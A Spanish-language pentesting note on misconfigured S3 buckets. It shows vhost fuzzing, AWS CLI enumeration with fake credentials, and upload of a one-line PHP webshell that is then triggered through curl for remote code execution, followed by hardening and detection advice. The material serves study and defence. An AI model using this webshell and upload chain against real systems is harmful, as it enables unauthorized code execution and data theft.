---
topic: s3-misconfiguration
tags: [cloud, aws, s3, misconfiguration]
---

# S3 mal configurado — buckets abiertos y webshell

[🇬🇧 English](s3-misconfiguration.en.md) | **Español**

> Nota reutilizable. No publicar claves ni datos reales.

## Idea

Un bucket S3 (o un servicio compatible como LocalStack o MinIO) puede quedar con **lectura o escritura anónima**. Si además está montado sobre el `document root` de un servidor web, subir un objeto equivale a subir un fichero ejecutable: la mala configuración de almacenamiento se convierte en ejecución remota.

## Cómo se descubre

- **Vhost**: fuzzing de subdominios (`s3.dominio.tld`, `bucket.dominio.tld`).
- **Respuesta distinta**: un `404` con cuerpo XML (`<Error><Code>AccessDenied`) delata S3 detrás de Apache/nginx.
- **DNS**: CNAME hacia `*.amazonaws.com`.
- **Código fuente**: rutas `s3://`, `AWS_ENDPOINT`, `bucket_name` en JS o en `.env` filtrados.

```bash
ffuf -u http://<HOST> -H "Host: FUZZ.<DOMINIO>" -w subdominios.txt -fs <tamano_del_404>
curl -s http://s3.<DOMINIO>/
```

## Enumeración con AWS CLI

```bash
aws configure set aws_access_key_id temp
aws configure set aws_secret_access_key temp
aws configure set default.region us-east-1

aws --endpoint=http://s3.<DOMINIO> s3 ls
aws --endpoint=http://s3.<DOMINIO> s3 ls s3://<BUCKET>
aws --endpoint=http://s3.<DOMINIO> s3 cp shell.php s3://<BUCKET>/shell.php
```

Notas:

- Si el endpoint no aplica IAM, credenciales inventadas valen: **la ausencia de autenticación es el fallo**.
- `--no-sign-request` sirve contra AWS real para buckets públicos.
- En AWS real, `aws s3 ls s3://bucket` sin credenciales prueba lectura anónima; `--acl public-read` en la subida prueba escritura.

## Cuándo pasa a RCE

| Condición | Resultado |
|---|---|
| Bucket = document root | El objeto subido se sirve y se ejecuta |
| Extensión permitida (`.php`, `.aspx`, `.jsp`) | Webshell directa |
| Sin validación de `Content-Type` | Se sirve como script |
| Bucket externo con CDN | Solo contenido estático: sin ejecución |

```bash
cat > shell.php <<'PHP'
<?php system($_GET['cmd']); ?>
PHP
aws --endpoint=http://s3.<DOMINIO> s3 cp shell.php s3://<BUCKET>/shell.php
curl -s "http://<DOMINIO>/shell.php?cmd=id"
```

## Impacto más allá de la webshell

- **Fuga de datos**: listar buckets con backups, `.env`, dumps de base y claves.
- **Sobrescritura**: reemplazar el `index.html` o el JS servido a los usuarios (defacement, skimming).
- **Supply chain**: colocar un binario o un paquete que otro sistema descarga del bucket.
- **Coste**: escritura masiva en un bucket facturable.

## Blindaje

- **Block Public Access** activado en la cuenta y en el bucket.
- Políticas de bucket que nieguen `s3:*` sin `aws:PrincipalArn` corporativo.
- Bucket separado del `document root`; nunca servir PHP desde almacenamiento de objetos.
- `Content-Type` y `Content-Disposition` forzados, y ejecución deshabilitada en el directorio de subidas.
- Auditoría con `aws s3api get-bucket-acl` y `get-bucket-policy`; cifrado y versionado.
- En entornos de laboratorio (LocalStack/MinIO), no exponer el puerto de administración.

## Detección

- `PUT`/`POST` a buckets desde IPs no habituales y desde procesos que no son el CI.
- `AccessDenied` repetidos seguidos de un listado correcto (enumeración).
- Objetos nuevos con extensión ejecutable (`.php`, `.aspx`, `.jsp`, `.sh`).
- Peticiones a `<bucket>.s3.amazonaws.com` desde el servidor web de la aplicación.

## Referencias

- <https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html>
- <https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum>
- <https://attack.mitre.org/techniques/T1530/>
